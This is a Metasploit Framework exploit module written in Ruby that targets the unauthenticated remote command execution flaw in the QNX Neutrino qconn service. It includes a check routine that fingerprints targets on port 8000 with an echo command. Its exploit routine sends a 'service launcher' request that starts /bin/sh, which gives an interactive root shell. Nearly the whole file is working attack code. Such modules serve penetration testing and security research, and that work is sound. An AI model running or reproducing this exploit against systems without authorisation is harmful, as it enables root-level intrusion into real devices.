# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "QNX QCONN Remote Command Execution Vulnerability",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability in the qconn component of
        QNX Neutrino which can be abused to allow unauthenticated users to
        execute arbitrary commands under the context of the &#039;root&#039; user.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;David Odell&#039;, # Discovery
          &#039;Mor!p3r <moriper[at]gmail.com>&#039;, # PoC
          &#039;Brendan Coles <bcoles[at]gmail.com>&#039; # Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;,   &#039;21520&#039;],
          [&#039;URL&#039;,   &#039;http://www.fishnetsecurity.com/6labs/blog/pentesting-qnx-neutrino-rtos&#039;],
          [&#039;URL&#039;,   &#039;http://www.qnx.com/developers/docs/6.3.0SP3/neutrino/utilities/q/qconn.html&#039;],
        ],
      &#039;Payload&#039;        =>
        {
          &#039;BadChars&#039;    => &#039;&#039;,
          &#039;DisableNops&#039; => true,
          &#039;Compat&#039;      =>
            {
              &#039;PayloadType&#039; => &#039;cmd_interact&#039;,
              &#039;ConnectionType&#039; => &#039;find&#039;,
            },
        },
      &#039;DefaultOptions&#039;  =>
        {
          &#039;WfsDelay&#039; => 10,
          &#039;PAYLOAD&#039;  => &#039;cmd/unix/interact&#039;,
        },
      &#039;Platform&#039;       => &#039;unix&#039;,    # QNX Neutrino
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Targets&#039;        =>
        [
          # Tested on QNX Neutrino 6.5 SP1
          [&#039;Automatic Targeting&#039;, { &#039;auto&#039; => true }]
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => &#039;Sep 4 2012&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        Opt::RPORT(8000)
      ], self.class)
  end

  def check

    @peer = "#{rhost}:#{rport}"

    # send check
    fingerprint = Rex::Text.rand_text_alphanumeric(rand(8)+4)
    print_status("#{@peer} - Sending check")
    connect
    req  = "service launcher\n"
    req << "start/flags run /bin/echo /bin/echo #{fingerprint}\n"
    sock.put(req)
    res  = sock.get
    disconnect

    # check response
    if    res and res =~ /#{fingerprint}/
      return Exploit::CheckCode::Vulnerable
    elsif res and res =~ /QCONN/
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Unknown
    end

  end

  def exploit

    @peer = "#{rhost}:#{rport}"

    # send payload
    req  = "service launcher\n"
    req << "start/flags run /bin/sh -\n"
    print_status("#{@peer} - Sending payload (#{req.length} bytes)")
    connect
    sock.put(req)
    res  = sock.get

    # check response
    if res and res =~ /No controlling tty/
      print_good("#{@peer} - Payload sent successfully")
    else
      print_error("#{@peer} - Sending payload failed")
    end
    handler
    disconnect

  end
end



